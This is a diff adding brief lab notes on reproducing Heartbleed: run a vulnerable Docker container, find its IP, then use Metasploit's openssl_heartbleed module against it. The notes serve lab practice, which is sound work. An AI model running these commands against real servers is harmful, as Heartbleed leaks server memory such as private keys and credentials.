@@ -1,0 +1,23 @@
+build heartbleed dockerfile
+
+then run
+docker run -d andrewmichaelsmith/docker-heartbleed
+
+"do"
+docker ps #note conatiner id
+docker inspect <container id> | grep IPAddress #note ip
+"to get containers ip"
+
+ docker run --rm -it metasploitframework/metasploit-framework
+to open metasploit (the -it command makes it interactive)
+
+
+then do
+
+use auxiliary/scanner/ssl/openssl_heartbleed
+set VERBOSE true
+set RHOSTS <ip>
+exploit
+
+
+(in msf console)
